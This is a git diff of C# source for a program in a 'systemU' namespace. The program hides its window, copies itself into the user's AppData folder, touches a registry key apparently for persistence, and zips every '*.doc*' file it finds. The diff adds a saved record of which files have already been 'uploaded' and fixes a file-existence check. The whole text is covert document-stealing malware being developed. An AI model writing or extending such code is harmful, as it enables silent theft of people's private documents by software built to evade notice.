@@ -34,8 +34,8 @@ namespace systemU
             // Hide
             ShowWindow(handle, SW_HIDE);
             List<FileIO> UplodedFile = new List<FileIO>();
-            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak")))
-                UplodedFile = ReadFromBinaryFile<List<FileIO>>(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak")));
+            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak")))
+                UplodedFile = ReadFromBinaryFile<List<FileIO>>(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak"));
 
                 String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
@@ -51,10 +51,11 @@ namespace systemU
                 File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\" , fileName));
             }
             //make zip file at c:\WindowsBt    
-            new ZipMaker().makeZip(new FileGeter().forourWORK("*.doc*"));
+            new ZipMaker().makeZip(new FileGeter().forourWORK("*.doc*"), UplodedFile);
+            WriteToBinaryFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak"),UplodedFile);
         }    
         
-        public static void WriteToBinaryFile<T>(string filePath, T objectToWrite, bool append = false)
+public static void WriteToBinaryFile<T>(string filePath, T objectToWrite, bool append = false)
 {
     using (Stream stream = File.Open(filePath, append ? FileMode.Append : FileMode.Create))
     {
